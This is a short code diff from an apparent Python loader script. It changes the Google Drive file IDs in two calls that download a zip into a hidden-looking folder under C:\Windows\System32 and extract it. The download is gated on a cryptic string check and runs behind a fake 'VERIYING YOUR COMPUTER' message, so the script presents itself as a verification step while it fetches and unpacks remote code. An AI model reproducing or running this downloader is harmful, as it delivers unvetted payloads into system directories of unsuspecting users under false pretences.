@@ -299,7 +299,7 @@ def download_file_from_google_drive(url, output_path):
         gdown.download(url, output=output_path, quiet=True)
 if file_contentsx1=="ZM2vsjeaWJHSf":
     if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aesprem-jan8.py"):
-        urllib.request.urlretrieve("https://drive.google.com/uc?id=1wy5wWtR64lanz8foa9dfzSaMVZCAc9vN", "C:\\Windows\\System32\\MSRXL\\premx.zip")
+        urllib.request.urlretrieve("https://drive.google.com/uc?id=1F-dt2LPglKmY_2eRMEGQxYnsJ5PDpK6E", "C:\\Windows\\System32\\MSRXL\\premx.zip")
         zip_file = r'C:\Windows\System32\MSRXL\premx.zip'
         extract_dir = r'C:\Windows\System32\MSRXL'
         extract_zip(zip_file, extract_dir)
@@ -311,7 +311,7 @@ if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aesprem-jan8.py"):
     print("")
     print("")
     print("---VERIYING YOUR COMPUTER PLEASE WAIT.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1wy5wWtR64lanz8foa9dfzSaMVZCAc9vN", "C:\\Windows\\System32\\MSRXL\\premx.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1F-dt2LPglKmY_2eRMEGQxYnsJ5PDpK6E", "C:\\Windows\\System32\\MSRXL\\premx.zip")
     zip_file = r'C:\Windows\System32\MSRXL\premx.zip'
     extract_dir = r'C:\Windows\System32\MSRXL'
     extract_zip(zip_file, extract_dir)
